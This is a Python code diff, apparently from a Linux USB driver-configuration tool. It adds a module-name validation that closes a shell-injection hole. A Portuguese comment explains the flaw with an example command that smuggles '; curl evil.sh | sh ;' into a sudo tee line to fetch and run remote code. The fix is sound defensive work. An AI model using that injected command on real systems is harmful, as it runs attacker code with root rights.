@@ -11,7 +11,7 @@ from __future__ import annotations
 import hashlib
 from dataclasses import dataclass, field
 
-from ..types import Confidence, Evidence
+from ..types import Confidence, Evidence, require_module_name
 from .transaction import create_transaction
 
 
@@ -130,6 +130,22 @@ def plan_state_b(
     )
     if not module:
         raise ValueError("feasible chipset without any candidate module")
+
+    # VALIDACAO OBRIGATORIA ANTES DE MONTAR COMANDO (ADR 0002 S1/S3/S6).
+    #
+    # `module` chega de tres origens NAO CONFIAVEIS: bound_driver e
+    # loaded_module vem do sysfs do host, e preferred_module/new_id_modules vem
+    # do JSON da base de conhecimento. Nenhuma delas era validada, e o valor era
+    # interpolado direto em strings de shell montadas logo abaixo — inclusive
+    # dentro de aspas simples e de um caminho.
+    #
+    # Uma aspa simples no nome escapava do quoting e emendava comando arbitrario
+    # numa linha que o proprio produto manda o usuario rodar com sudo:
+    #
+    #   echo '148f 7601' | sudo tee /sys/bus/usb/drivers/mt7601u' ; curl evil.sh | sh ; '/new_id
+    #
+    # `require_module_name` ja existia e simplesmente nao era chamada aqui.
+    module = require_module_name(module)
 
     conf_path = f"/etc/modprobe.d/ddr-{vid}-{pid}.conf"
     alias = _alias_line(vid, pid, module)
